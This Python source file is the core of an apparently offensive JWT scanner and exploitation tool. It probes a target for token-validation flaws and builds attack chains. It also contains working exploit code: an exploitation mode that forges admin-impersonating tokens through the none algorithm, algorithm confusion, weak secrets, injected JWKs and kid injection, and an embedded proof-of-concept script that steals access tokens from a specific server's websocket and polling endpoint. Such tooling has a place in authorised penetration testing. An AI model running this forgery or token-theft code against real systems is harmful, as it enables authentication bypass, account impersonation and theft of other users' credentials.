from datetime import datetime
from typing import Dict, List, Optional, Any, Set
from urllib.parse import urljoin, urlparse

from .core import JWTCore, WordlistLoader, DEFAULT_WORDLIST_DATA
from .enums import Level, Risk, _kurtVuln_list, chain_attack
from .models import jq_vuln_list, chain_vuln_quete_attack
from .constants import BANNER
from .vulnerabilities import (
    test_none_algorithm,
    test_weak_secret,
    test_algorithm_confusion,
    test_signature_removal,
    test_unknown_algorithm,
    test_jku_injection,
    test_jwk_injection,
    test_kid_injection,
    test_jwks_cache_poisoning,
    test_jwk_missing_alg,
    test_expiration,
    test_audience_issuer,
    test_claim_type_confusion,
    test_websocket_event_leak,
    test_unauth_token_polling,
    test_cross_system_leakage,
)


class Jquete(JWTCore):
    def __init__(self, target_url: str, jwt_token: str, **kwargs):
        self.level = Level(kwargs.get("level", 1))
        self.risk = Risk(kwargs.get("risk", 1))
        self.threads = kwargs.get("threads", 10)
        self.delay = kwargs.get("delay", 0)
        self.verbose = kwargs.get("verbose", False)
        self.batch = kwargs.get("batch", False)
        self.output_file = kwargs.get("output")
        self.detect_chains = kwargs.get("chains", True)
        self.cross_domain = kwargs.get("cross_domain", False)
        self.websocket_check = kwargs.get("websocket", True)

        self.exploit_mode = kwargs.get("exploit", False)
        self.target_endpoint = kwargs.get("target_endpoint")
        self.impersonate = kwargs.get("impersonate", "admin")

        wordlist_loader = WordlistLoader(kwargs.get("wordlist_dir"), self.verbose)
        self.weak_secrets = wordlist_loader.load("weak_secrets.txt", "weak_secrets")
        self.jwks_endpoints = wordlist_loader.load(
            "jwks_endpoints.txt", "jwks_endpoints"
        )
        self.kid_traversal_payloads = wordlist_loader.load(
            "kid_traversal.txt", "kid_traversal"
        )
        self.kid_sql_payloads = wordlist_loader.load("kid_sql.txt", "kid_sql")
        self.kid_cmd_payloads = wordlist_loader.load("kid_cmd.txt", "kid_cmd")
        self.websocket_endpoints = wordlist_loader.load(
            "websocket_endpoints.txt", "websocket"
        )
        self.polling_endpoints = wordlist_loader.load(
            "polling_endpoints.txt", "polling"
        )

        super().__init__(
            target_url=target_url,
            jwt_token=jwt_token,
            proxy=kwargs.get("proxy"),
            timeout=kwargs.get("timeout", 15),
            cookie_name=kwargs.get("cookie_name", "session"),
            wordlist_dir=kwargs.get("wordlist_dir"),
            verbose=self.verbose,
        )

        self.vulnerabilities: List[jq_vuln_list] = []
        self.chains: List[chain_vuln_quete_attack] = []
        self.discovered_endpoints: Set[str] = set()
        self.discovered_websockets: Set[str] = set()
        self.cross_systems: List[str] = []
        self.jwks_uri: Optional[str] = None
        self.public_keys: Dict[str, str] = {}

        self.stats = {
            "requests": 0,
            "errors": 0,
            "vulns_found": 0,
            "chains_found": 0,
            "start_time": datetime.now(),
        }

        if not self._parse_token():
            raise ValueError("Invalid JWT token")

    def _parse_token(self) -> bool:
        return super()._parse_token()

    def discover_endpoints(self):
        from colorama import Fore, Style
        import base64
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.backends import default_backend

        print(f"\n{Fore.CYAN}[*] Discovering endpoints...{Style.RESET_ALL}")

        for endpoint in self.jwks_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if "keys" in data or "jwks" in str(data).lower():
                            self.jwks_uri = url
                            self.discovered_endpoints.add(url)
                            print(
                                f"{Fore.GREEN}[+] Found JWKS endpoint: {url}{Style.RESET_ALL}"
                            )
                            self._dump_pub_jwt_key(data)
                    except:
                        pass
            except:
                pass

        oidc_url = urljoin(self.target_url, "/.well-known/openid-configuration")
        try:
            response = self.session.get(oidc_url, timeout=self.timeout)
            if response.status_code == 200:
                data = response.json()
                if "jwks_uri" in data:
                    self.jwks_uri = data["jwks_uri"]
                    self.discovered_endpoints.add(data["jwks_uri"])
                    print(
                        f"{Fore.GREEN}[+] Found JWKS URI from OIDC: {data['jwks_uri']}{Style.RESET_ALL}"
                    )
                    try:
                        jwk_response = self.session.get(
                            data["jwks_uri"], timeout=self.timeout
                        )
                        if jwk_response.status_code == 200:
                            self._dump_pub_jwt_key(jwk_response.json())
                    except:
                        pass
        except:
            pass

    def _dump_pub_jwt_key(self, jwks_data):
        from colorama import Fore, Style
        import base64
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.backends import default_backend

        try:
            keys = jwks_data.get("keys", [])
            for key in keys:
                if key.get("kty") == "RSA":
                    n = int.from_bytes(
                        base64.urlsafe_b64decode(key["n"] + "==="), "big"
                    )
                    e = int.from_bytes(
                        base64.urlsafe_b64decode(key["e"] + "==="), "big"
                    )
                    public_key = rsa.RSAPublicNumbers(e, n).public_key(
                        default_backend()
                    )
                    pem = public_key.public_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PublicFormat.SubjectPublicKeyInfo,
                    ).decode()
                    kid = key.get("kid", "unknown")
                    self.public_keys[kid] = pem
                    print(
                        f"{Fore.GREEN}[+] Extracted public key (kid: {kid}){Style.RESET_ALL}"
                    )
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[DEBUG] Key extraction error: {e}{Style.RESET_ALL}")

    def scan_all(self):
        from colorama import Fore, Style

        print(BANNER)
        print(f"{Fore.CYAN}[*] Target: {self.target_url}{Style.RESET_ALL}")
        print(
            f"{Fore.CYAN}[*] Level: {self.level.name} | Risk: {self.risk.name}{Style.RESET_ALL}"
        )
        print(
            f"{Fore.CYAN}[*] Started at: {self.stats['start_time'].strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}"
        )

        self.discover_endpoints()

        test_none_algorithm(self)
        test_signature_removal(self)
        test_expiration(self)
        test_audience_issuer(self)
        test_unknown_algorithm(self)

        if self.level.value >= Level.LOW.value:
            test_weak_secret(self)
            test_cross_system_leakage(self)

        if self.level.value >= Level.MEDIUM.value:
            test_algorithm_confusion(self)
            test_jku_injection(self)
            test_jwk_injection(self)

        if self.level.value >= Level.HIGH.value:
            test_kid_injection(self)
            test_jwks_cache_poisoning(self)
            test_websocket_event_leak(self)
            test_unauth_token_polling(self)
            test_claim_type_confusion(self)
            test_jwk_missing_alg(self)

        if self.detect_chains:
            self._correlate_chains()

        self.stats["vulns_found"] = len(self.vulnerabilities)
        self.stats["chains_found"] = len(self.chains)

        self.print_report()

        if self.exploit_mode:
            self.run_exploitation(self.target_endpoint, self.impersonate)

    def _correlate_chains(self):
        vuln_types = {v.type for v in self.vulnerabilities}

        if (
            _kurtVuln_list.WEBSOCKET_INFO_LEAK in vuln_types
            and _kurtVuln_list.UNAUTH_TOKEN_POLLING in vuln_types
        ):
            chain_vulns = [
                v
                for v in self.vulnerabilities
                if v.type
                in [
                    _kurtVuln_list.WEBSOCKET_INFO_LEAK,
                    _kurtVuln_list.UNAUTH_TOKEN_POLLING,
                ]
            ]
            steps = [
                "1. Connect to WebSocket with serverevents=all parameter to monitor ACCESS_REQUEST events",
                "2. Extract request IDs from events",
                "3. Poll the unauthenticated token endpoint with captured request ID",
                "4. Retrieve JWT token when request is approved",
            ]
            poc = self._generate_token_theft_poc()
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.TOKEN_THEFT_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Attacker can steal any JWT token issued by the server without authentication",
                exploit_steps=steps,
                poc_code=poc,
                cvss_score=9.1,
            )
            self.chains.append(chain)

        if (
            _kurtVuln_list.PUBLIC_KEY_EXPOSURE in vuln_types
            and _kurtVuln_list.ALGORITHM_CONFUSION in vuln_types
        ):
            chain_vulns = [
                v
                for v in self.vulnerabilities
                if v.type
                in [
                    _kurtVuln_list.PUBLIC_KEY_EXPOSURE,
                    _kurtVuln_list.ALGORITHM_CONFUSION,
                ]
            ]
            steps = [
                "1. Retrieve server's public key from exposed JWKS endpoint",
                "2. Convert public key to PEM format",
                "3. Create a new JWT with modified payload (e.g., sub=administrator)",
                "4. Sign token using HS256 with the public key as secret",
                "5. Send forged token to server",
            ]
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.ALGORITHM_CONFUSION_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Authentication bypass and privilege escalation",
                exploit_steps=steps,
                cvss_score=9.1,
            )
            self.chains.append(chain)

        kid_related = [
            _kurtVuln_list.KID_PATH_TRAVERSAL,
            _kurtVuln_list.KID_SQL_INJECTION,
            _kurtVuln_list.KID_COMMAND_INJECTION,
        ]

        if any(v in vuln_types for v in kid_related):
            chain_vulns = [v for v in self.vulnerabilities if v.type in kid_related]
            steps = []
            if _kurtVuln_list.KID_PATH_TRAVERSAL in vuln_types:
                steps.append("1. Use path traversal in kid to read arbitrary files")
            if _kurtVuln_list.KID_SQL_INJECTION in vuln_types:
                steps.append(
                    "2. Exploit SQL injection in kid to extract keys from database"
                )
            if _kurtVuln_list.KID_COMMAND_INJECTION in vuln_types:
                steps.append(
                    "3. Use command injection in kid to execute system commands"
                )
            steps.append("4. Forge arbitrary tokens using retrieved key material")
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.KID_INJECTION_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Complete key material compromise and token forgery",
                exploit_steps=steps,
                cvss_score=9.0,
            )
            self.chains.append(chain)

        if (
            _kurtVuln_list.JKU_INJECTION in vuln_types
            and _kurtVuln_list.JWKS_CACHE_POISONING in vuln_types
        ):
            chain_vulns = [
                v
                for v in self.vulnerabilities
                if v.type
                in [_kurtVuln_list.JKU_INJECTION, _kurtVuln_list.JWKS_CACHE_POISONING]
            ]
            steps = [
                "1. Inject malicious JKU header pointing to attacker-controlled JWKS",
                "2. Server fetches and caches the attacker's public key",
                "3. Subsequent tokens signed with attacker's private key are accepted",
                "4. Cache poisoning persists until cache expires",
            ]
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.JWKS_POISONING_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Persistent token forgery capability",
                exploit_steps=steps,
                cvss_score=8.5,
            )
            self.chains.append(chain)

        if (
            _kurtVuln_list.UNKNOWN_ALG_BYPASS in vuln_types
            and _kurtVuln_list.NONE_ALGORITHM in vuln_types
        ):
            chain_vulns = [
                v
                for v in self.vulnerabilities
                if v.type
                in [_kurtVuln_list.UNKNOWN_ALG_BYPASS, _kurtVuln_list.NONE_ALGORITHM]
            ]
            steps = [
                "1. Set alg header to unknown value",
                "2. Server may fall back to none algorithm or accept without verification",
                "3. Remove signature or use empty signature",
                "4. Forge arbitrary payload",
            ]
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.UNKNOWN_ALG_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Signature bypass and token forgery",
                exploit_steps=steps,
                cvss_score=9.0,
            )
            self.chains.append(chain)

        if (
            _kurtVuln_list.EXPIRATION_MISSING in vuln_types
            or _kurtVuln_list.EXPIRATION_LONG in vuln_types
        ):
            chain_vulns = [
                v
                for v in self.vulnerabilities
                if v.type
                in [_kurtVuln_list.EXPIRATION_MISSING, _kurtVuln_list.EXPIRATION_LONG]
            ]
            steps = [
                "1. Token has no expiration or very long lifetime",
                "2. Attacker can reuse stolen token indefinitely",
                "3. Combine with other vulnerabilities for persistent access",
            ]
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.EXPIRATION_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Token replay and persistent unauthorized access",
                exploit_steps=steps,
                cvss_score=5.0,
            )
            self.chains.append(chain)

        if _kurtVuln_list.CROSS_SYSTEM_LEAKAGE in vuln_types:
            chain_vulns = [
                v
                for v in self.vulnerabilities
                if v.type == _kurtVuln_list.CROSS_SYSTEM_LEAKAGE
            ]
            steps = [
                "1. JWT token leaked in response",
                "2. Attacker captures token and uses it to access other systems",
                "3. If token has excessive permissions, lateral movement possible",
            ]
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.CROSS_SYSTEM_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Token leakage enabling lateral movement",
                exploit_steps=steps,
                cvss_score=7.0,
            )
            self.chains.append(chain)

        if _kurtVuln_list.CLAIM_TYPE_CONFUSION in vuln_types:
            chain_vulns = [
                v
                for v in self.vulnerabilities
                if v.type == _kurtVuln_list.CLAIM_TYPE_CONFUSION
            ]
            steps = [
                "1. Modify a claim (e.g., nbf, exp) to have incorrect type",
                "2. Server may skip validation for that claim",
                "3. Use to bypass time constraints or other restrictions",
            ]
            chain = chain_vuln_quete_attack(
                chain_type=chain_attack.TYPE_CONFUSION_CHAIN,
                vulnerabilities=chain_vulns,
                impact="Bypass of temporal constraints or claim validation",
                exploit_steps=steps,
                cvss_score=5.5,
            )
            self.chains.append(chain)

    def _generate_token_theft_poc(self) -> str:
        return """#!/usr/bin/env python3
import json
import websocket
import requests
import time
import sys

def exploit(target_host, target_port=3000):
    ws_url = f"ws://{target_host}:{target_port}/signalk/v1/stream?serverevents=all"
    http_base = f"http://{target_host}:{target_port}"
    
    ws = websocket.create_connection(ws_url)
    print(f"[*] Connected to {ws_url}")
    
    request_ids = []
    timeout = time.time() + 60
    while time.time() < timeout:
        try:
            msg = ws.recv()
            data = json.loads(msg)
            if data.get("type") == "ACCESS_REQUEST":
                req_data = data.get("data", [{}])[0]
                req_id = req_data.get("requestId")
                if req_id and req_id not in request_ids:
                    request_ids.append(req_id)
                    print(f"[+] Found request ID: {req_id}")
                    poll_url = f"{http_base}/signalk/v1/access/requests/{req_id}"
                    r = requests.get(poll_url)
                    if r.status_code == 200:
                        token = r.json().get("accessRequest", {}).get("token")
                        if token:
                            print(f"[!] TOKEN STOLEN: {token}")
                            return token
        except Exception as e:
            break
    ws.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <target_host>")
        sys.exit(1)
    exploit(sys.argv[1])
"""

    def print_report(self):
        from colorama import Fore, Style

        self.stats["end_time"] = datetime.now()
        duration = (self.stats["end_time"] - self.stats["start_time"]).total_seconds()

        print(f"\n{Fore.CYAN}=== Scan Report ==={Style.RESET_ALL}")
        print(f"Target: {self.target_url}")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Requests: {self.stats['requests']}")
        print(f"Errors: {self.stats['errors']}")
        print(f"Vulnerabilities found: {self.stats['vulns_found']}")
        print(f"Attack chains identified: {self.stats['chains_found']}")

        if self.vulnerabilities:
            print(f"\n{Fore.YELLOW}VULNERABILITIES:{Style.RESET_ALL}")
            for i, v in enumerate(self.vulnerabilities, 1):
                severity_color = (
                    Fore.RED
                    if v.severity == "CRITICAL"
                    else Fore.YELLOW
                    if v.severity == "HIGH"
                    else Fore.CYAN
                )
                print(
                    f"{severity_color}[{i}] {v.type.value} ({v.severity}){Style.RESET_ALL}"
                )
                print(f"     Description: {v.description}")
                if v.cve_reference:
                    print(f"     CVE: {v.cve_reference}")
                if v.exploit_payload:
                    print(f"     Payload: {v.exploit_payload[:100]}...")
                if v.proof:
                    print(f"     Proof: {v.proof[:100]}...")
                print()

        if self.chains:
            print(f"\n{Fore.MAGENTA}ATTACK CHAINS DETECTED:{Style.RESET_ALL}")
            for i, chain in enumerate(self.chains, 1):
                print(
                    f"{Fore.MAGENTA}[Chain {i}] {chain.chain_type.value}{Style.RESET_ALL}"
                )
                print(f"     Impact: {chain.impact}")
                print(f"     CVSS Score: {chain.cvss_score}")
                print("     Steps:")
                for step in chain.exploit_steps:
                    print(f"       {step}")
                if chain.poc_code:
                    print("     PoC Code available (use --output to save)")
                print()

        if self.output_file:
            self._save_output()

    def _save_output(self):
        import json
        from colorama import Fore, Style

        output = {
            "target": self.target_url,
            "timestamp": self.stats["start_time"].isoformat(),
            "duration": (
                self.stats["end_time"] - self.stats["start_time"]
            ).total_seconds(),
            "requests": self.stats["requests"],
            "vulnerabilities": [
                {
                    "type": v.type.value,
                    "severity": v.severity,
                    "description": v.description,
                    "exploit_payload": v.exploit_payload,
                    "proof": v.proof,
                    "cve": v.cve_reference,
                    "cvss": v.cvss_score,
                    "exploit_token": v._exploit_payload_token,
                }
                for v in self.vulnerabilities
            ],
            "chains": [
                {
                    "type": chain.chain_type.value,
                    "impact": chain.impact,
                    "steps": chain.exploit_steps,
                    "cvss": chain.cvss_score,
                }
                for chain in self.chains
            ],
        }
        with open(self.output_file, "w") as f:
            json.dump(output, f, indent=2)
        print(f"{Fore.GREEN}[+] Results saved to {self.output_file}{Style.RESET_ALL}")

    def run_exploitation(
        self, target_endpoint: str = None, impersonate_str: str = "admin"
    ):
        from colorama import Fore, Style
        import json

        if not self.vulnerabilities:
            print(f"{Fore.YELLOW}[!] No vulnerabilities to exploit.{Style.RESET_ALL}")
            return

        target = target_endpoint if target_endpoint else self.target_url
        impersonate_claims = self._parse_impersonation(impersonate_str)

        print(f"\n{Fore.MAGENTA}=== Starting Exploitation Phase ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target endpoint: {target}{Style.RESET_ALL}")
        print(
            f"{Fore.CYAN}[*] Impersonation claims: {impersonate_claims}{Style.RESET_ALL}"
        )

        for vuln in self.vulnerabilities:
            if not vuln.exploitable:
                continue

            if not self.batch:
                answer = input(
                    f"\n{Fore.YELLOW}[?] Attempt exploitation for {vuln.type.value}? (y/N): {Style.RESET_ALL}"
                )
                if answer.lower() != "y":
                    continue

            self._attempt_exploitation(vuln, target, impersonate_claims)

    def _parse_impersonation(self, impersonate_str: str) -> dict:
        import json

        claims = {}
        if impersonate_str.startswith("{"):
            try:
                claims = json.loads(impersonate_str)
            except json.JSONDecodeError:
                print(f"{Fore.RED}[!] Invalid JSON for impersonation{Style.RESET_ALL}")
        else:
            parts = impersonate_str.split(",")
            for part in parts:
                if "=" in part:
                    k, v = part.split("=", 1)
                    claims[k.strip()] = v.strip()
        return claims

    def _attempt_exploitation(
        self, vuln: jq_vuln_list, target_url: str, impersonate_claims: dict
    ) -> bool:
        from colorama import Fore, Style
        import time
        import base64
        import json
        import jwt as pyjwt

        from .vulnerabilities.injection import generate_rsa_keypair

        print(
            f"{Fore.CYAN}[*] Attempting exploitation for {vuln.type.value}...{Style.RESET_ALL}"
        )

        payload = self.payload.copy()
        payload.update(impersonate_claims)

        forged_token = None

        if vuln.type == _kurtVuln_list.NONE_ALGORITHM:
            header = self.header.copy()
            header["alg"] = "none"
            encoded_header = (
                base64.urlsafe_b64encode(json.dumps(header).encode())
                .decode()
                .rstrip("=")
            )
            encoded_payload = (
                base64.urlsafe_b64encode(json.dumps(payload).encode())
                .decode()
                .rstrip("=")
            )
            forged_token = f"{encoded_header}.{encoded_payload}."

        elif vuln.type == _kurtVuln_list.WEAK_SECRET:
            secret = vuln.exploit_payload
            forged_token = pyjwt.encode(
                payload, secret, algorithm=self.header.get("alg", "HS256")
            )

        elif vuln.type == _kurtVuln_list.ALGORITHM_CONFUSION:
            if self.public_keys:
                pem = list(self.public_keys.values())[0]
                header = self.header.copy()
                header["alg"] = "HS256"
                forged_token = pyjwt.encode(
                    payload, pem, algorithm="HS256", headers=header
                )

        elif vuln.type == _kurtVuln_list.JWK_INJECTION:
            priv_key, pub_key = generate_rsa_keypair()
            header = self.header.copy()
            header["jwk"] = pub_key["keys"][0]
            header["alg"] = "RS256"
            forged_token = pyjwt.encode(
                payload, priv_key, algorithm="RS256", headers=header
            )

        elif vuln.type == _kurtVuln_list.KID_PATH_TRAVERSAL:
            header = self.header.copy()
            header["kid"] = vuln.exploit_payload
            forged_token = pyjwt.encode(payload, "", algorithm="HS256", headers=header)

        elif vuln.type == _kurtVuln_list.KID_SQL_INJECTION:
            header = self.header.copy()
            header["kid"] = vuln.exploit_payload
            forged_token = pyjwt.encode(
                payload, "dummy", algorithm="HS256", headers=header
            )

        elif vuln.type == _kurtVuln_list.KID_COMMAND_INJECTION:
            header = self.header.copy()
            header["kid"] = vuln.exploit_payload
            forged_token = pyjwt.encode(payload, "", algorithm="HS256", headers=header)

        elif vuln.type == _kurtVuln_list.SIGNATURE_REMOVAL:
            parts = self.original_token.split(".")
            encoded_payload = (
                base64.urlsafe_b64encode(json.dumps(payload).encode())
                .decode()
                .rstrip("=")
            )
            forged_token = f"{parts[0]}.{encoded_payload}."

        elif vuln.type == _kurtVuln_list.UNKNOWN_ALG_BYPASS:
            header = self.header.copy()
            header["alg"] = "zzz"
            encoded_header = (
                base64.urlsafe_b64encode(json.dumps(header).encode())
                .decode()
                .rstrip("=")
            )
            encoded_payload = (
                base64.urlsafe_b64encode(json.dumps(payload).encode())
                .decode()
                .rstrip("=")
            )
            forged_token = f"{encoded_header}.{encoded_payload}."

        elif vuln.type in [
            _kurtVuln_list.EXPIRATION_MISSING,
            _kurtVuln_list.EXPIRATION_LONG,
        ]:
            if "exp" in payload:
                payload["exp"] = int(time.time()) + 86400 * 365
            encoded_payload = (
                base64.urlsafe_b64encode(json.dumps(payload).encode())
                .decode()
                .rstrip("=")
            )
            parts = self.original_token.split(".")
            forged_token = f"{parts[0]}.{encoded_payload}.{self.signature}"

        elif vuln.type == _kurtVuln_list.CLAIM_TYPE_CONFUSION:
            forged_token = self.original_token

        elif vuln.type == _kurtVuln_list.JWK_MISSING_ALG_CONFUSION:
            priv_key, pub_key = generate_rsa_keypair()
            if "alg" in pub_key["keys"][0]:
                del pub_key["keys"][0]["alg"]
            header = self.header.copy()
            header["jwk"] = pub_key["keys"][0]
            header["alg"] = "HS256"
            forged_token = pyjwt.encode(
                payload, priv_key, algorithm="RS256", headers=header
            )

        if not forged_token:
            print(
                f"{Fore.YELLOW}[-] Cannot forge token for this vuln type.{Style.RESET_ALL}"
            )
            return False

        try:
            response = self.make_request(target_url, forged_token, delay=self.delay)
            success = (
                response.status_code == 200
                and "unauthorized" not in response.text.lower()
            )

            if success:
                print(f"{Fore.GREEN}[+] Exploitation successful!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Forged token: {forged_token}{Style.RESET_ALL}")
                print(
                    f"{Fore.GREEN}    Response status: {response.status_code}{Style.RESET_ALL}"
                )
                if self.verbose:
                    print(
                        f"{Fore.GREEN}    Response snippet: {response.text[:200]}{Style.RESET_ALL}"
                    )
                vuln._exploit_payload_token = forged_token
            else:
                print(
                    f"{Fore.RED}[-] Exploitation failed (HTTP {response.status_code}){Style.RESET_ALL}"
                )

            return success
        except Exception as e:
            print(f"{Fore.RED}[!] Exploitation request failed: {e}{Style.RESET_ALL}")
            return False
